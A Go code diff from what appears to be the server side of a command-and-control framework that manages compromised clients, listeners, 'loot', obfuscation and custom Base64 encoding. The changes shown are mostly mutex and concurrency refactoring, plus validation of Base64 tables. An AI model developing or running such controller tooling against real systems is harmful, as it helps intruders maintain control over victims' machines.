@@ -72,11 +72,10 @@ var (
 
 	/*不可清理*/
 	base_map = make(map[string]string) //存
-	/*不可清理*/ baseMutex sync.RWMutex
+	/*不可清理*/ serverRouteMu sync.RWMutex // 同时保护 base_map 和 code_map
 	/*不可清理*/ uid_base = make(map[string]string) //写
 	/*不可清理*/ uidMutex sync.RWMutex
 	/*不可清理*/ code_map = make(map[string]map[byte]int)
-	/*不可清理*/ cmapMutex sync.RWMutex
 
 	sessionSlice []string
 	/*不可清理*/ error_str string
@@ -127,13 +126,11 @@ type MainHandler struct{}
 func (m *MainHandler) Index(conn, Get_Msg, switch_key, encry_key, download, result, net, info, upload, list,
 	option, uid_, hostname, keyPart, filekey, windows_pro, port string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
-		baseMutex.RLock()
+		serverRouteMu.RLock()
 		base_rounds, exist_base := base_map[port]
-		baseMutex.RUnlock()
-		cmapMutex.RLock()
 		code_rounds, exist_code := code_map[port]
-		cmapMutex.RUnlock()
-		if !exist_base && !exist_code {
+		serverRouteMu.RUnlock()
+		if !exist_base || !exist_code {
 			return
 		}
 		switch r.Method {
@@ -353,56 +350,93 @@ var upgrader = websocket.Upgrader{
 
 type WSClient struct {
 	Conn    *websocket.Conn
-	WriteMu sync.Mutex
+	ConnMu  sync.RWMutex // 保护 Conn 指针
+	ReadMu  sync.Mutex   // 保证同一连接只有一个读者
+	WriteMu sync.Mutex   // 保证写操作串行
 }
 
 var wsUsers = make(map[string][]*WSClient)
 var wsUsersMu sync.RWMutex
 
-// 新增：线程安全的写操作与关闭
+func (c *WSClient) getConn() *websocket.Conn {
+	if c == nil {
+		return nil
+	}
+
+	c.ConnMu.RLock()
+	conn := c.Conn
+	c.ConnMu.RUnlock()
+
+	return conn
+}
+
 func (c *WSClient) WriteJSON(v interface{}) error {
 	if c == nil {
 		return fmt.Errorf("nil ws client")
 	}
+
 	c.WriteMu.Lock()
 	defer c.WriteMu.Unlock()
-	if c.Conn == nil {
+
+	conn := c.getConn()
+	if conn == nil {
 		return fmt.Errorf("nil ws conn")
 	}
-	return c.Conn.WriteJSON(v)
+
+	return conn.WriteJSON(v)
 }
+
 func (c *WSClient) WriteMessage(messageType int, data []byte) error {
 	if c == nil {
 		return fmt.Errorf("nil ws client")
 	}
+
 	c.WriteMu.Lock()
 	defer c.WriteMu.Unlock()
-	if c.Conn == nil {
+
+	conn := c.getConn()
+	if conn == nil {
 		return fmt.Errorf("nil ws conn")
 	}
-	return c.Conn.WriteMessage(messageType, data)
+
+	return conn.WriteMessage(messageType, data)
 }
-func (c *WSClient) Close() error {
-	if c == nil {
-		return nil
-	}
-	c.WriteMu.Lock()
-	defer c.WriteMu.Unlock()
-	if c.Conn == nil {
-		return nil
-	}
-	err := c.Conn.Close()
-	c.Conn = nil
-	return err
-}
+
 func (c *WSClient) ReadMessage() (int, []byte, error) {
 	if c == nil {
 		return 0, nil, fmt.Errorf("nil ws client")
 	}
-	if c.Conn == nil {
+
+	// 不要持有 ConnMu 调用阻塞式 ReadMessage
+	c.ReadMu.Lock()
+	defer c.ReadMu.Unlock()
+
+	conn := c.getConn()
+	if conn == nil {
 		return 0, nil, fmt.Errorf("nil ws conn")
 	}
-	return c.Conn.ReadMessage()
+
+	return conn.ReadMessage()
+}
+
+func (c *WSClient) Close() error {
+	if c == nil {
+		return nil
+	}
+
+	c.WriteMu.Lock()
+	defer c.WriteMu.Unlock()
+
+	c.ConnMu.Lock()
+	conn := c.Conn
+	c.Conn = nil
+	c.ConnMu.Unlock()
+
+	if conn == nil {
+		return nil
+	}
+
+	return conn.Close()
 }
 
 func PushWS(username string, path string, data interface{}) {
@@ -423,7 +457,7 @@ func PushWS(username string, path string, data interface{}) {
 	deadMap := make(map[string]map[*WSClient]struct{})
 	for user, clients := range targets {
 		for _, c := range clients {
-			if c == nil || c.Conn == nil {
+			if c == nil || c.getConn() == nil {
 				if deadMap[user] == nil {
 					deadMap[user] = make(map[*WSClient]struct{})
 				}
@@ -651,24 +685,26 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 		PushData(usernameCookie.Value, "loot")
 
 		defer func() {
-			wsUsersMu.Lock()
-			defer wsUsersMu.Unlock()
-			// 从 map 取出切片（直接修改并写回）
-			clients := wsUsers[usernameCookie.Value]
-			if len(clients) > 0 {
+			func() {
+				wsUsersMu.Lock()
+				defer wsUsersMu.Unlock()
+				username := usernameCookie.Value
+				clients := wsUsers[username]
 				for i, c := range clients {
-					if c == clientWs { // 按指针比较
-						clients = append(clients[:i], clients[i+1:]...)
-						break
+					if c != clientWs {
+						continue
 					}
+					copy(clients[i:], clients[i+1:])
+					clients[len(clients)-1] = nil
+					clients = clients[:len(clients)-1]
+					break
 				}
 				if len(clients) == 0 {
-					delete(wsUsers, usernameCookie.Value)
+					delete(wsUsers, username)
 				} else {
-					wsUsers[usernameCookie.Value] = clients
+					wsUsers[username] = clients
 				}
-			}
-			// 使用 WSClient 的 Close 方法安全关闭连接（已经做了锁）
+			}()
 			if clientWs != nil {
 				_ = clientWs.Close()
 			}
@@ -841,7 +877,8 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 					if info != "" {
 						windows_clientMu.Lock()
 						for i := range windows_client_data.Clients {
-							if uid == windows_client_data.Clients[i].Uid {
+							client := &windows_client_data.Clients[i]
+							if uid == client.Uid {
 								lastIdx := len(windows_client_data.Clients) - 1
 								windows_client_data.Clients[i] = windows_client_data.Clients[lastIdx]
 								windows_client_data.Clients = windows_client_data.Clients[:lastIdx]
@@ -853,7 +890,8 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 					} else {
 						clientDataMu.Lock()
 						for i := range client_data.Clients {
-							if uid == client_data.Clients[i].Uid {
+							client := &client_data.Clients[i]
+							if uid == client.Uid {
 								lastIdx := len(client_data.Clients) - 1
 								client_data.Clients[i] = client_data.Clients[lastIdx]
 								client_data.Clients = client_data.Clients[:lastIdx]
@@ -891,7 +929,8 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 
 					mapMu.Lock()
 					for i := len(msg_map_list) - 1; i >= 0; i-- {
-						if msg_map_list[i].Uid == uid {
+						msg := &msg_map_list[i]
+						if msg.Uid == uid {
 							msg_map_list = append(msg_map_list[:i], msg_map_list[i+1:]...)
 						}
 					}
@@ -903,7 +942,8 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 
 					fcache.Lock()
 					for i := len(msg_file_cache) - 1; i >= 0; i-- {
-						if msg_file_cache[i].Uid == uid {
+						item := &msg_file_cache[i]
+						if item.Uid == uid {
 							msg_file_cache = append(msg_file_cache[:i], msg_file_cache[i+1:]...)
 						}
 					}
@@ -911,7 +951,8 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 
 					dataInnetmu.Lock()
 					for i := len(data_innet.Innets) - 1; i >= 0; i-- {
-						if data_innet.Innets[i].Uid == uid {
+						innet := &data_innet.Innets[i]
+						if innet.Uid == uid {
 							data_innet.Innets = append(data_innet.Innets[:i], data_innet.Innets[i+1:]...)
 						}
 					}
@@ -1263,9 +1304,9 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 					arr[1] = port
 					server = strings.Join(arr[:2], ":")
 
-					baseMutex.RLock()
+					serverRouteMu.RLock()
 					base_rounds, exist := base_map[port]
-					baseMutex.RUnlock()
+					serverRouteMu.RUnlock()
 					if !exist {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code":    404,
@@ -1331,8 +1372,9 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 
 					blocked := false
 					clientDataMu.RLock()
-					for c := range client_data.Clients {
-						if client_data.Clients[c].Server == serverRemark {
+					for i := range client_data.Clients {
+						client := &client_data.Clients[i]
+						if client.Server == serverRemark {
 							blocked = true
 							break
 						}
@@ -1353,8 +1395,9 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 
 					blocked = false
 					windows_clientMu.RLock()
-					for c := range windows_client_data.Clients {
-						if windows_client_data.Clients[c].Server == serverRemark {
+					for i := range windows_client_data.Clients {
+						client := &windows_client_data.Clients[i]
+						if client.Server == serverRemark {
 							blocked = true
 							break
 						}
@@ -1373,27 +1416,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						continue
 					}
 
-					serverDataMu.Lock()
-					for i := len(server_data.Servers) - 1; i >= 0; i-- {
-						if server_data.Servers[i].Port == port {
-							server_data.Servers = append(
-								server_data.Servers[:i],
-								server_data.Servers[i+1:]...,
-							)
-							break
-						}
-					}
-					serverDataMu.Unlock()
-
-					baseMutex.Lock()
-					delete(base_map, port)
-					baseMutex.Unlock()
-
-					cmapMutex.Lock()
-					delete(code_map, port)
-					cmapMutex.Unlock()
-
-					go protocol.StopServer(port)
+					protocol.StopServer(port)
 					stopStr := fmt.Sprintf(
 						log_word["removed_server"],
 						port,
@@ -1868,7 +1891,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						})
 						continue
 					}
-					serverPluginMu.Lock()
+					serverPluginMu.RLock()
 					exists := false
 					for i := range server_plugin.Plugins {
 						plugin := &server_plugin.Plugins[i]
@@ -1877,7 +1900,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 							break
 						}
 					}
-					serverPluginMu.Unlock()
+					serverPluginMu.RUnlock()
 					if exists {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code":    400,
@@ -2401,91 +2424,91 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						}
 					}
 
+					var decodeMap map[byte]int
 					if requestData.BaseRounds != "" {
-						if len(requestData.BaseRounds) != 64 {
+						if !isValidBase64Table(requestData.BaseRounds) {
 							clientWs.WriteJSON(map[string]interface{}{
 								"code":    400,
 								"path":    "startServer",
-								"message": "Base64 table must be 64 characters",
+								"message": "Base64 table must be a permutation of A-Z, a-z, 0-9, - and _",
 							})
 							continue
 						}
 
-						charSet := make(map[rune]bool)
-						dupBase := false
-						for _, c := range requestData.BaseRounds {
-							if charSet[c] {
-								dupBase = true
-								break
-							}
-							charSet[c] = true
-						}
-						if dupBase {
-							clientWs.WriteJSON(map[string]interface{}{
-								"code":    400,
-								"path":    "startServer",
-								"message": "Base64 table contains duplicate characters",
-							})
-							continue
-						}
-
-						decodeMap := buildDecodeMap(requestData.BaseRounds)
-						baseMutex.Lock()
-						base_map[requestData.Port] = requestData.BaseRounds
-						baseMutex.Unlock()
-
-						cmapMutex.Lock()
-						code_map[requestData.Port] = decodeMap
-						cmapMutex.Unlock()
+						decodeMap = buildDecodeMap(requestData.BaseRounds)
 					} else {
-						baseRounds := generateRandomBase64Table()
-						decodeMap := buildDecodeMap(baseRounds)
-
-						baseMutex.Lock()
-						base_map[requestData.Port] = baseRounds
-						baseMutex.Unlock()
-
-						cmapMutex.Lock()
-						code_map[requestData.Port] = decodeMap
-						cmapMutex.Unlock()
-
-						requestData.BaseRounds = baseRounds
+						requestData.BaseRounds = generateRandomBase64Table()
+						if requestData.BaseRounds == "" {
+							clientWs.WriteJSON(map[string]interface{}{
+								"code":    500,
+								"path":    "startServer",
+								"message": "failed to generate Base64 table",
+							})
+							continue
+						}
+						decodeMap = buildDecodeMap(requestData.BaseRounds)
 					}
 
-					if requestData.Protocol == "https" || requestData.Protocol == "http" || requestData.Protocol == "quic" {
-						handler := &MainHandler{}
-						serverManager := &MyServer{}
-						go protocol.Http_server(
-							handler,
-							serverManager,
-							logger,
-							requestData.Port,
-							requestData.Path,
-							requestData.ConnPath,
-							requestData.MsgPath,
-							requestData.SwitchKey,
-							requestData.EncryKey,
-							requestData.Download,
-							requestData.Result,
-							requestData.Net,
-							requestData.Info,
-							requestData.Upload,
-							requestData.List,
-							requestData.Option,
-							requestData.Protocol,
-							requestData.Uid,
-							requestData.Hostname,
-							requestData.KeyPart,
-							requestData.Filekey,
-							requestData.Remark,
-							requestData.CertContent,
-							requestData.KeyContent,
-							requestData.WindowsPro,
-							requestData.BaseRounds,
-							requestData.ResponseHead,
-							requestData.Username,
-							log_word,
-						)
+					switch requestData.Protocol {
+					case "http", "https", "quic":
+					default:
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "startServer",
+							"message": "unsupported protocol",
+						})
+						continue
+					}
+
+					handler := &MainHandler{}
+					serverManager := &MyServer{}
+					startErr := protocol.Http_server(
+						handler,
+						serverManager,
+						logger,
+						requestData.Port,
+						requestData.Path,
+						requestData.ConnPath,
+						requestData.MsgPath,
+						requestData.SwitchKey,
+						requestData.EncryKey,
+						requestData.Download,
+						requestData.Result,
+						requestData.Net,
+						requestData.Info,
+						requestData.Upload,
+						requestData.List,
+						requestData.Option,
+						requestData.Protocol,
+						requestData.Uid,
+						requestData.Hostname,
+						requestData.KeyPart,
+						requestData.Filekey,
+						requestData.Remark,
+						requestData.CertContent,
+						requestData.KeyContent,
+						requestData.WindowsPro,
+						requestData.BaseRounds,
+						requestData.ResponseHead,
+						requestData.Username,
+						log_word,
+						func() {
+							serverRouteMu.Lock()
+							base_map[requestData.Port] = requestData.BaseRounds
+							code_map[requestData.Port] = decodeMap
+							serverRouteMu.Unlock()
+						},
+						func() {
+							cleanupServerState(requestData.Port)
+						},
+					)
+					if startErr != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "startServer",
+							"message": "server start failed: " + startErr.Error(),
+						})
+						continue
 					}
 					clientWs.WriteJSON(map[string]interface{}{
 						"code":    200,
@@ -2861,7 +2884,7 @@ func Windows_GetInfo(uid, encry_str, key, clientIP string, code_map map[byte]int
 }
 func updateServerClients(port string, serverChan chan<- string) {
 	serverRemark := "unknown"
-	serverDataMu.Lock()
+	serverDataMu.RLock()
 	for i := range server_data.Servers {
 		server := &server_data.Servers[i]
 		if port == server.Port {
@@ -2870,7 +2893,7 @@ func updateServerClients(port string, serverChan chan<- string) {
 			break
 		}
 	}
-	serverDataMu.Unlock()
+	serverDataMu.RUnlock()
 	serverChan <- serverRemark
 }
 func Change_pro(uid, username, remarks, delay, jitter, Taskid string) string {
@@ -2894,7 +2917,8 @@ func Change_pro(uid, username, remarks, delay, jitter, Taskid string) string {
 			if username != client.Username {
 				userExists := false
 				for j := range windows_client_data.Clients {
-					if windows_client_data.Clients[j].Username == username {
+					otherClient := &windows_client_data.Clients[j]
+					if otherClient.Username == username {
 						userExists = true
 						break
 					}
@@ -2957,7 +2981,8 @@ func Change(uid, username, remarks, delay, jitter, Taskid string) string {
 			if username != client.Username {
 				userExists := false
 				for j := range client_data.Clients {
-					if client_data.Clients[j].Username == username {
+					otherClient := &client_data.Clients[j]
+					if otherClient.Username == username {
 						userExists = true
 						break
 					}
@@ -3377,7 +3402,8 @@ func deleteConnAtIndex(index int, delbase bool) bool {
 		return false
 	}
 
-	uid = data_conn.Conns[index].Uid
+	conn := &data_conn.Conns[index]
+	uid = conn.Uid
 	data_conn.Conns = append(
 		data_conn.Conns[:index],
 		data_conn.Conns[index+1:]...,
@@ -3396,7 +3422,8 @@ func DeleteEntry(delshell string, delbase bool) {
 	dataConnMu.Lock()
 	index := -1
 	for i := range data_conn.Conns {
-		if data_conn.Conns[i].Uid == delshell {
+		conn := &data_conn.Conns[i]
+		if conn.Uid == delshell {
 			index = i
 			break
 		}
@@ -3406,7 +3433,8 @@ func DeleteEntry(delshell string, delbase bool) {
 		return
 	}
 
-	uid := data_conn.Conns[index].Uid
+	conn := &data_conn.Conns[index]
+	uid := conn.Uid
 	data_conn.Conns = append(
 		data_conn.Conns[:index],
 		data_conn.Conns[index+1:]...,
@@ -3488,7 +3516,8 @@ func Del_file_list(uid, indexStr string) bool {
 	// 找到 uid 对应的所有文件的索引
 	var uidIndices []int
 	for i := range msg_file_cache {
-		if msg_file_cache[i].Uid == uid {
+		item := &msg_file_cache[i]
+		if item.Uid == uid {
 			uidIndices = append(uidIndices, i)
 		}
 	}
@@ -4287,8 +4316,8 @@ func GetChatSlice() []Chat {
 }
 
 func updateChatSlice(chatid string) []Chat {
-	dataChatmu.Lock()
-	defer dataChatmu.Unlock()
+	dataChatmu.RLock()
+	defer dataChatmu.RUnlock()
 	for i := range data_chat.Chats {
 		chat := &data_chat.Chats[i]
 		if chat.Chatid == chatid {
@@ -4348,6 +4377,25 @@ func updateServerIndex(port string) []Server {
 		}
 	}
 	return nil
+}
+
+func cleanupServerState(port string) {
+	serverDataMu.Lock()
+	for i := len(server_data.Servers) - 1; i >= 0; i-- {
+		server := &server_data.Servers[i]
+		if server.Port == port {
+			server_data.Servers = append(
+				server_data.Servers[:i],
+				server_data.Servers[i+1:]...,
+			)
+		}
+	}
+	serverDataMu.Unlock()
+
+	serverRouteMu.Lock()
+	delete(base_map, port)
+	delete(code_map, port)
+	serverRouteMu.Unlock()
 }
 
 type EnrichedClient struct {
@@ -4430,8 +4478,9 @@ func updateIndex(uid string) *EnrichedClient {
 	var clientCopy Client
 	found := false
 	for i := range client_data.Clients {
-		if uid == client_data.Clients[i].Uid {
-			clientCopy = client_data.Clients[i]
+		client := &client_data.Clients[i]
+		if uid == client.Uid {
+			clientCopy = *client
 			found = true
 			break
 		}
@@ -4546,8 +4595,9 @@ func updateIndex_windows(uid string) *EnrichedWindowsClient {
 	var clientCopy WindowsClient
 	found := false
 	for i := range windows_client_data.Clients {
-		if uid == windows_client_data.Clients[i].Uid {
-			clientCopy = windows_client_data.Clients[i]
+		client := &windows_client_data.Clients[i]
+		if uid == client.Uid {
+			clientCopy = *client
 			found = true
 			break
 		}
@@ -5067,15 +5117,29 @@ func ClearUnmarkedGlobalVars() {
 
 	// 12) 清理websocket连接
 	wsUsersMu.Lock()
+	clientsToClose := make([]*WSClient, 0)
+	seen := make(map[*WSClient]struct{})
+
 	for _, clients := range wsUsers {
 		for _, c := range clients {
-			if c != nil && c.Conn != nil {
-				_ = c.Conn.Close()
+			if c == nil {
+				continue
 			}
+			if _, exists := seen[c]; exists {
+				continue
+			}
+
+			seen[c] = struct{}{}
+			clientsToClose = append(clientsToClose, c)
 		}
 	}
+
 	wsUsers = make(map[string][]*WSClient)
 	wsUsersMu.Unlock()
+
+	for _, c := range clientsToClose {
+		_ = c.Close()
+	}
 
 	// 14) 写日志（这里可以直接写，不影响锁）
 	logStr := log_word["Memory_clean"]
@@ -5100,8 +5164,9 @@ func updateInnet(uid string) Innet {
 	defer dataInnetmu.RUnlock()
 
 	for i := len(data_innet.Innets) - 1; i >= 0; i-- {
-		if data_innet.Innets[i].Uid == uid {
-			return data_innet.Innets[i]
+		innet := &data_innet.Innets[i]
+		if innet.Uid == uid {
+			return *innet
 		}
 	}
 	return Innet{}
@@ -5160,7 +5225,7 @@ func ObfuscateBySteps(data []byte, k ObfConst) []byte {
 			prev0 = *at(0, col)
 			prev1 = *at(1, col)
 			prev2 = *at(2, col)
-			k.A, k.B, k.C = updateState(k.A,k.B,k.C, prev0, prev1, prev2, 7)
+			k.A, k.B, k.C = updateState(k.A, k.B, k.C, prev0, prev1, prev2, 7)
 		} else {
 			*at(1, col) = (prev0 ^ *at(1, col)) | k.D
 			*at(0, col) = prev1 ^ (*at(0, col) ^ k.E)
@@ -5168,7 +5233,7 @@ func ObfuscateBySteps(data []byte, k ObfConst) []byte {
 			prev0 = *at(0, col)
 			prev1 = *at(1, col)
 			prev2 = *at(2, col)
-			k.D, k.E, k.F = updateState(k.D,k.E,k.F, prev0, prev1, prev2, 11)
+			k.D, k.E, k.F = updateState(k.D, k.E, k.F, prev0, prev1, prev2, 11)
 		}
 	}
 	if remainder > 0 {
@@ -5252,12 +5317,6 @@ func Get_encry_f(data *[]byte, key *string) ([]byte, error) {
 	return Encrypt(*data, []byte(*key)), nil
 }
 
-// 文件解密
-func Get_decry_f(plain []byte, outputFile *os.File, key []byte) error {
-	_, err := outputFile.Write(Decrypt(plain, key))
-	return err
-}
-
 // 字符串解密
 func Get_decry_s(input, key *string, decodeMap map[byte]int) string {
 	data, err := customBase64Decode(*input, decodeMap)
@@ -5286,6 +5345,28 @@ func generateRandomBase64Table() string {
 		charset[i], charset[j] = charset[j], charset[i]
 	}
 	return string(charset)
+}
+
+func isValidBase64Table(value string) bool {
+	const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
+	if len(value) != len(alphabet) {
+		return false
+	}
+
+	var allowed [256]bool
+	for i := 0; i < len(alphabet); i++ {
+		allowed[alphabet[i]] = true
+	}
+
+	var seen [256]bool
+	for i := 0; i < len(value); i++ {
+		char := value[i]
+		if !allowed[char] || seen[char] {
+			return false
+		}
+		seen[char] = true
+	}
+	return true
 }
 
 func buildDecodeMap(base_rounds string) map[byte]int {
@@ -5540,7 +5621,8 @@ func put_innet(uid, target string, shell_innet []string) {
 	changed := false
 	dataInnetmu.Lock()
 	for i := range data_innet.Innets {
-		if uid == data_innet.Innets[i].Uid && target == data_innet.Innets[i].Target {
+		innet := &data_innet.Innets[i]
+		if uid == innet.Uid && target == innet.Target {
 			data_innet.Innets = append(data_innet.Innets[:i], data_innet.Innets[i+1:]...)
 			data_innet.Innets = append(data_innet.Innets, newInnet)
 			changed = true
@@ -5591,17 +5673,18 @@ func (s *MyServer) PutServer(
 	upload, list, option, protocol, remark string,
 	certPEM, keyPEM, uid, hostname, keyPart, filekey, windows_pro, base_rounds, resphead, username string,
 ) bool {
+	if remark == "" {
+		remark = port + protocol
+	}
+
 	serverDataMu.Lock()
-	defer serverDataMu.Unlock()
 	for i := range server_data.Servers {
 		server := &server_data.Servers[i]
 		if server.Port == port || server.Remark == remark {
-			log.Printf("Server with port %v and remark %v already exists.\n", port, protocol)
+			serverDataMu.Unlock()
+			log.Printf("Server with port %v and remark %v already exists.\n", port, remark)
 			return false
 		}
-	}
-	if remark == "" {
-		remark = port + protocol
 	}
 	newServer := Server{
 		Port:         port,
@@ -5633,6 +5716,7 @@ func (s *MyServer) PutServer(
 	}
 
 	server_data.Servers = append(server_data.Servers, newServer)
+	serverDataMu.Unlock()
 
 	go PushAgentData(port, "updateServer")
 
@@ -6274,7 +6358,8 @@ func login(login_route, ui_route, web_css, web_title, login_file string) http.Ha
 				}
 				found := false
 				for s := range sessionSlice {
-					if sessionSlice[s] == cookie_value {
+					session := &sessionSlice[s]
+					if *session == cookie_value {
 						found = true
 						break
 					}
